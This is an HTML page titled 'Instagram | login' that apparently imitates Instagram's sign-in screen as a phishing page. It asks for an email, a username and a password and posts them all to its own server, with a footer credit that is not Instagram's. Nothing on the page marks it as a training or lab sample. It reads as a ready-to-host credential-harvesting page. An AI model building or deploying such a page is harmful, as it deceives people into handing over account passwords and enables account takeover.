<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js">
    <link rel="stylesheet" href="/css/styles.css">
    <title>Instagram | login</title>
</head>

<body>
    <div>
        <form action="/" method="post">
            <div class="u-part">
                To use this wesite Sign in here :
                <input type="email" class="input" name="email" placeholder="Email adress" required>
                <button class="sign" type="submit">Sign in</button>
            </div>
            <div id="wrapper">
                <div class="content">
                    <div class="main-content">
                        <div class="header">
                            <img src="/css/zqpwkLQ.png" />
                        </div>
                        <div class="l-part">
                            <input class="input-1" type="text" name="username" placeholder="Username" required>
                            <div class="overlap-text">
                                <input class="input-2" type="password" name="password" placeholder="Password" required>
                            </div>
                            <button class="btn" name="submit" type="submit">Log in</button>
                        </div>
                        <div class="dforgot">
                            <a class="forgot" href="#">Forgot password?</a>
                        </div>
                    </div>
                    <div class="sub-content">
                        <div class="s-part">
                            Don't have an account?<a href="#">Sign up</a>
                        </div>
                    </div>
                </div>
            </div>
            <footer class="end">
                <a href="#">FAQ</a>
                <a href="#">Contact us</a>
                <a href="#">Privacy Policy</a>
                <a href="#">&copy; AMYES2017</a>
            </footer>
        </form>
    </div>
    <script src="/css/index.js"></script>

</body>

</html>
